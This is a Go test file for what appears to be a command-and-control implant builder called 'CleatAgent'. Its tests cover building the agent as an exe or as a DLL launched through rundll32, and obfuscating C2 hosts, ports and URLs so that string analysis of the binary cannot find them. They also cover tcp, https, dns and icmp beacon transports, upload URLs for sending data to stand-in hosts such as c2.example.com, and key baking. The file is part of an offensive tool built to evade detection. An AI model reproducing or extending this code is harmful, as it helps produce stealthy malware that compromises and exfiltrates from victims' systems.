package artifact

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestBuildScript 验证构建脚本关键片段(CLEAT_AS_DLL=OFF / Release / 加密 / vcvars64)。
func TestBuildScript(t *testing.T) {
	g := &Generator{AgentDir: `D:\a`, VcvarsBat: `D:\vcvars64.bat`, BuildDir: `D:\b`}
	// exe 形态
	s := g.buildScript(false, nil, false)
	for _, want := range []string{
		`call "D:\vcvars64.bat"`, `-DCLEAT_ENCRYPTION=ON`, `-DCLEAT_AS_DLL=OFF`,
		`-DCMAKE_BUILD_TYPE=Release`, `--config Release`, `-S "D:\a" -B "D:\b"`,
	} {
		if !strings.Contains(s, want) {
			t.Errorf("buildScript(exe) 应含 %q, got:\n%s", want, s)
		}
	}
	// dll 形态
	d := g.buildScript(true, nil, false)
	if !strings.Contains(d, `-DCLEAT_AS_DLL=ON`) {
		t.Errorf("buildScript(dll) 应含 -DCLEAT_AS_DLL=ON, got:\n%s", d)
	}
	// 烧参数
	b := g.buildScript(false, map[string]string{"CLEAT_DEFAULT_HOST": "1.2.3.4", "CLEAT_DEFAULT_PORT": "5555"}, false)
	if !strings.Contains(b, `-DCLEAT_DEFAULT_HOST="1.2.3.4"`) || !strings.Contains(b, `-DCLEAT_DEFAULT_PORT="5555"`) {
		t.Errorf("buildScript 应含烧参数宏, got:\n%s", b)
	}
}

// TestBakeDefs 验证烧参数映射: 地址类字段走混淆块(B1), 密钥宏维持原样。
func TestBakeDefs(t *testing.T) {
	s := Spec{Transport: "tcp", Host: "10.0.0.1", Port: "4444", PSK: "ab"}
	_ = s.resolveKeys() // psk 模式无密钥变化
	defs, err := s.bakeDefs()
	if err != nil {
		t.Fatalf("bakeDefs 失败: %v", err)
	}
	// 地址类字段不得再以明文宏出现(否则 .rdata 可直接 strings 出 C2)
	for _, k := range []string{"CLEAT_DEFAULT_TRANSPORT", "CLEAT_DEFAULT_HOST",
		"CLEAT_DEFAULT_PORT", "CLEAT_DEFAULT_URL", "CLEAT_DEFAULT_DNS_DOMAIN"} {
		if v, ok := defs[k]; ok {
			t.Errorf("地址类字段不应烧明文宏 %s=%q", k, v)
		}
	}
	blob := defs["CLEAT_DEFAULT_OBF"]
	if blob == "" {
		t.Fatalf("应烧入混淆块: %v", defs)
	}
	if strings.Contains(blob, "10.0.0.1") || strings.Contains(blob, "4444") {
		t.Errorf("混淆块 hex 不应含明文值: %s", blob)
	}
	got, err := obfDecode(blob)
	if err != nil {
		t.Fatalf("混淆块自检解码失败: %v", err)
	}
	if got[obfIDHost] != "10.0.0.1" || got[obfIDPort] != "4444" || got[obfIDTransport] != "tcp" {
		t.Errorf("混淆块内容不符: %v", got)
	}
	if _, ok := got[obfIDURL]; ok {
		t.Errorf("tcp 不应带 url: %v", got)
	}
	if !strings.Contains(defs["CLEAT_DEFAULT_PSK"], "ab") {
		t.Errorf("psk 应烧入")
	}
}

// TestBakeDefsNoAddrFields 无地址类字段时不烧混淆块(空=不定义宏, 走内置默认/CLI)。
func TestBakeDefsNoAddrFields(t *testing.T) {
	s := Spec{}
	defs, err := s.bakeDefs()
	if err != nil {
		t.Fatalf("bakeDefs 失败: %v", err)
	}
	if _, ok := defs["CLEAT_DEFAULT_OBF"]; ok {
		t.Errorf("无地址类字段时不应烧混淆块: %v", defs)
	}
}

// TestObfRoundTrip 覆盖全字段/超 255 字节长值/掩码错位(2 字节大端长度)。
func TestObfRoundTrip(t *testing.T) {
	longURL := "https://c2.example.com/" + strings.Repeat("a", 300)
	fields := []obfField{
		{obfIDTransport, "https"},
		{obfIDHost, "c2.example.com"},
		{obfIDPort, "8443"},
		{obfIDURL, longURL},
		{obfIDUploadURL, "https://c2.example.com/up"},
		{obfIDDNSServer, "8.8.8.8:53"},
		{obfIDDNSDomain, "d.example.com"},
		{obfIDICMPTarget, "10.1.2.3"},
	}
	hexStr, err := obfEncode(fields)
	if err != nil {
		t.Fatalf("obfEncode 失败: %v", err)
	}
	for _, f := range fields {
		if f.value != "" && strings.Contains(hexStr, f.value) {
			t.Errorf("混淆块 hex 含明文 %q", f.value)
		}
	}
	got, err := obfDecode(hexStr)
	if err != nil {
		t.Fatalf("obfDecode 失败: %v", err)
	}
	for _, f := range fields {
		if got[f.id] != f.value {
			t.Errorf("字段 %d 往返不一致: got %q want %q", f.id, got[f.id], f.value)
		}
	}

	// 全空 → 不烧块
	if hexStr, err := obfEncode(nil); err != nil || hexStr != "" {
		t.Errorf("空字段应返回空块: %q, %v", hexStr, err)
	}
	// 损坏的 hex → 解码报错(不静默通过)
	if _, err := obfDecode("zzzz"); err == nil {
		t.Errorf("非法 hex 应报错")
	}
	if _, err := obfDecode(hexStr[:len(hexStr)-2]); err == nil {
		t.Errorf("截断的块应报错")
	}
}

// TestRunLine 验证启动命令模板按形态(exe 直接 / dll 用 rundll32)。
func TestRunLine(t *testing.T) {
	args := []string{"--transport", "https", "--url", "https://c2/poll"}
	if got := runLine("exe", "CleatAgent.exe", args); got != "CleatAgent.exe --transport https --url https://c2/poll" {
		t.Errorf("exe run line 不符: %q", got)
	}
	if got := runLine("dll", "CleatAgent.dll", args); !strings.HasPrefix(got, "rundll32.exe CleatAgent.dll,StartW ") {
		t.Errorf("dll run line 应含 rundll32: %q", got)
	}
}

func TestArgsTCP_PSK(t *testing.T) {
	s := Spec{Transport: "tcp", Host: "1.2.3.4", Port: "4444", KeyMode: "psk", PSK: strings.Repeat("ab", 32)}
	args, err := s.Args()
	if err != nil {
		t.Fatalf("Args: %v", err)
	}
	got := strings.Join(args, " ")
	for _, want := range []string{"--host", "1.2.3.4", "--port", "4444", "--psk"} {
		if !strings.Contains(got, want) {
			t.Errorf("缺少参数 %q: %s", want, got)
		}
	}
}

func TestArgsHTTPS_Upload(t *testing.T) {
	s := Spec{Transport: "https", URL: "https://c2/poll", UploadURL: "https://c2/up", KeyMode: "psk", PSK: "x"}
	args, err := s.Args()
	if err != nil {
		t.Fatalf("Args: %v", err)
	}
	if !strings.Contains(strings.Join(args, " "), "--upload-url https://c2/up") {
		t.Errorf("应含 upload-url: %v", args)
	}
}

// TestArgsHTTPS_UploadDerived 验证省略 upload-url 时按 /beacon/poll 约定推导
// (回归: 上传帧回退 poll 路径被 server 当探活丢弃, 上报无声 )。
func TestArgsHTTPS_UploadDerived(t *testing.T) {
	s := Spec{Transport: "https", URL: "https://c2:8443/beacon/poll", KeyMode: "psk", PSK: "x"}
	args, err := s.Args()
	if err != nil {
		t.Fatalf("Args: %v", err)
	}
	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "--upload-url https://c2:8443/beacon/upload") {
		t.Errorf("应推导出 upload-url: %v", args)
	}

	// 非约定路径: 不推导, 不输出 --upload-url(保持旧行为由操作员显式给)
	s2 := Spec{Transport: "https", URL: "https://c2/custom/path", KeyMode: "psk", PSK: "x"}
	args2, err := s2.Args()
	if err != nil {
		t.Fatalf("Args: %v", err)
	}
	if strings.Contains(strings.Join(args2, " "), "--upload-url") {
		t.Errorf("非约定路径不应输出 upload-url: %v", args2)
	}
}

func TestDeriveUploadURL(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://c2:8443/beacon/poll", "https://c2:8443/beacon/upload"},
		{"https://c2/beacon/poll?x=1", ""}, // 带 query 不推导(避免猜错), 由操作员显式给
		{"https://c2/other", ""},
		{"", ""},
	}
	for _, c := range cases {
		if got := DeriveUploadURL(c.in); got != c.want {
			t.Errorf("DeriveUploadURL(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestArgsMissingMode(t *testing.T) {
	// tcp 缺 host → 报错
	if _, err := (Spec{Transport: "tcp", Port: "1", KeyMode: "psk", PSK: "x"}).Args(); err == nil {
		t.Fatal("tcp 缺 host 应报错")
	}
	// 未知 transport → 报错
	if _, err := (Spec{Transport: "pipe", KeyMode: "psk", PSK: "x"}).Args(); err == nil {
		t.Fatal("未知 transport 应报错")
	}
	// psk 缺 psk → 报错
	if _, err := (Spec{Transport: "tcp", Host: "h", Port: "1", KeyMode: "psk"}).Args(); err == nil {
		t.Fatal("psk 缺 key 应报错")
	}
}

func TestX25519KeyDerivation(t *testing.T) {
	// x25519 模式: 只给 server 私钥 → 自动派生公钥
	s := Spec{Transport: "icmp", ICMPTarget: "1.1.1.1", KeyMode: "x25519", X25519Key: strings.Repeat("01", 32)}
	if err := s.resolveKeys(); err != nil {
		t.Fatalf("resolveKeys: %v", err)
	}
	if len(s.ServerPubkey) != 64 {
		t.Fatalf("应派生 64hex 公钥, got %q", s.ServerPubkey)
	}
	args, err := s.Args()
	if err != nil {
		t.Fatalf("Args: %v", err)
	}
	hasPub := false
	for i, a := range args {
		if a == "--server-pubkey" && i+1 < len(args) && len(args[i+1]) == 64 {
			hasPub = true
		}
	}
	if !hasPub {
		t.Errorf("x25519 应注入 --server-pubkey(64hex): %v", args)
	}
}

// TestApplyDefaults 验证交付默认密钥模式(x25519), 且显式指定不被覆盖。
func TestApplyDefaults(t *testing.T) {
	s := &Spec{Transport: "tcp", Host: "1.2.3.4", Port: "4444"}
	s.applyDefaults()
	if s.KeyMode != "x25519" {
		t.Errorf("空 key_mode 应默认 x25519, got %q", s.KeyMode)
	}
	p := &Spec{KeyMode: "psk"}
	p.applyDefaults()
	if p.KeyMode != "psk" {
		t.Errorf("显式 psk 不应被覆盖, got %q", p.KeyMode)
	}
}

// TestResolveKeysReusesKeyStore 验证长期密钥对: 首次生成并落盘, 后续复用同一对。
func TestResolveKeysReusesKeyStore(t *testing.T) {
	g := &Generator{OutRoot: t.TempDir()}
	s1 := &Spec{Transport: "tcp", Host: "h", Port: "1"}
	s1.applyDefaults()
	if err := g.resolveKeys(s1); err != nil {
		t.Fatalf("resolveKeys: %v", err)
	}
	if len(s1.X25519Key) != 64 || len(s1.ServerPubkey) != 64 {
		t.Fatalf("应生成密钥对, got priv=%q pub=%q", s1.X25519Key, s1.ServerPubkey)
	}
	if s1.keyReused {
		t.Error("首次生成不应标记复用")
	}
	if _, err := os.Stat(g.keyStorePath()); err != nil {
		t.Errorf("密钥对应落盘: %v", err)
	}

	s2 := &Spec{Transport: "tcp", Host: "h", Port: "1"}
	s2.applyDefaults()
	if err := g.resolveKeys(s2); err != nil {
		t.Fatalf("resolveKeys(2): %v", err)
	}
	if s2.X25519Key != s1.X25519Key || s2.ServerPubkey != s1.ServerPubkey {
		t.Errorf("应复用长期密钥对: %q/%q vs %q/%q", s2.X25519Key, s2.ServerPubkey, s1.X25519Key, s1.ServerPubkey)
	}
	if !s2.keyReused {
		t.Error("复用时应标记 keyReused")
	}
}

// TestGenerateRejectsPSKBake 验证 psk+烧参在构建前就被拒(否则白等一次编译)。
// 现场编译路径默认关闭, 故显式开启 AllowCompile 以触及该前置校验。
func TestGenerateRejectsPSKBake(t *testing.T) {
	g := &Generator{AgentDir: t.TempDir(), OutRoot: t.TempDir(), AllowCompile: true}
	_, err := g.Generate(&Spec{Transport: "tcp", Host: "h", Port: "1", Bake: true,
		KeyMode: "psk", PSK: strings.Repeat("cd", 32)})
	if err == nil || !strings.Contains(err.Error(), "PSK 明文") {
		t.Fatalf("psk+--bake 应在构建前被拒: %v", err)
	}
}

// TestGenerateCompileDisabledByDefault 验证现场编译路径默认关闭(零工具链出样本的前提)。
func TestGenerateCompileDisabledByDefault(t *testing.T) {
	g := &Generator{AgentDir: t.TempDir(), OutRoot: t.TempDir()}
	_, err := g.Generate(&Spec{Transport: "tcp", Host: "h", Port: "1"})
	if err == nil || !strings.Contains(err.Error(), "allow-compile") {
		t.Fatalf("默认应拒绝现场编译: %v", err)
	}
}

// TestVerifyArtifact 验证产物自检: 秘密硬失败, 明文 C2 仅告警。
func TestVerifyArtifact(t *testing.T) {
	dir := t.TempDir()
	g := &Generator{OutRoot: dir}
	write := func(name string, b []byte) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, b, 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	psk := strings.Repeat("cd", 32)
	priv := strings.Repeat("01", 32)

	if _, err := g.verifyArtifact(write("psk.bin", []byte("junk"+psk+"junk")), &Spec{KeyMode: "psk", PSK: psk}); err == nil {
		t.Error("二进制含 PSK 明文应硬失败")
	}
	if _, err := g.verifyArtifact(write("priv.bin", []byte("junk"+priv+"junk")), &Spec{KeyMode: "x25519", X25519Key: priv}); err == nil {
		t.Error("二进制含服务端私钥应硬失败")
	}

	// 烧参数 + x25519: 公钥必须在产物内(否则样本上不了线)
	pub := strings.Repeat("ab", 32)
	noPub := &Spec{KeyMode: "x25519", Bake: true, ServerPubkey: pub, Host: "10.0.0.5"}
	if _, err := g.verifyArtifact(write("nopub.bin", []byte("no key here")), noPub); err == nil {
		t.Error("烧参数但公钥未进产物应硬失败")
	}

	// 未烧参数: 地址/密钥都在运行期注入, 二进制不含 → 无告警无错误
	plain := &Spec{KeyMode: "x25519", ServerPubkey: pub, Host: "10.0.0.5"}
	warns, err := g.verifyArtifact(write("plain.bin", []byte("nothing")), plain)
	if err != nil || len(warns) != 0 {
		t.Errorf("未烧参数不应告警/报错: warns=%v err=%v", warns, err)
	}

	// 烧参数且地址进了产物: 只告警(B1 后正常应为空), 不阻断
	withC2 := &Spec{KeyMode: "x25519", Bake: true, ServerPubkey: pub, Host: "10.0.0.5"}
	warns, err = g.verifyArtifact(write("c2.bin", []byte("xx"+pub+"xx10.0.0.5xx")), withC2)
	if err != nil {
		t.Fatalf("明文 C2 应告警而非阻断: %v", err)
	}
	if len(warns) == 0 {
		t.Error("应报出明文 host 告警")
	}

	// 混淆未生效时端口值同样应命中
	portHit := &Spec{KeyMode: "x25519", Bake: true, ServerPubkey: pub, Port: "5599"}
	warns, err = g.verifyArtifact(write("port.bin", []byte("xx"+pub+"xx5599xx")), portHit)
	if err != nil || len(warns) == 0 {
		t.Errorf("明文端口应告警: warns=%v err=%v", warns, err)
	}

	// 与内置默认相同的取值不算泄露(字面量本来就在 AgentConfig.hpp 里), 不得误报
	def := &Spec{KeyMode: "x25519", Bake: true, ServerPubkey: pub, Host: "127.0.0.1", Port: "4444"}
	warns, err = g.verifyArtifact(write("def.bin", []byte("xx"+pub+"xx127.0.0.1xx4444xx")), def)
	if err != nil || len(warns) != 0 {
		t.Errorf("内置默认值不应告警: warns=%v err=%v", warns, err)
	}
}

// TestBuiltBin 验证产物定位不再依赖固定的源码树路径(VS 多配置输出 <build>/Release/)。
func TestBuiltBin(t *testing.T) {
	dir := t.TempDir()
	g := &Generator{BuildDir: dir}
	if _, err := g.builtBin("exe"); err == nil {
		t.Error("空构建目录应报错")
	}
	sub := filepath.Join(dir, "Release")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	want := filepath.Join(sub, "CleatAgent.exe")
	if err := os.WriteFile(want, []byte("bin"), 0o644); err != nil {
		t.Fatal(err)
	}
	got, err := g.builtBin("exe")
	if err != nil {
		t.Fatalf("builtBin: %v", err)
	}
	if got != want {
		t.Errorf("应定位到 %s, got %s", want, got)
	}
	if _, err := g.builtBin("dll"); err == nil {
		t.Error("只有 exe 时 dll 形态应报错")
	}
}
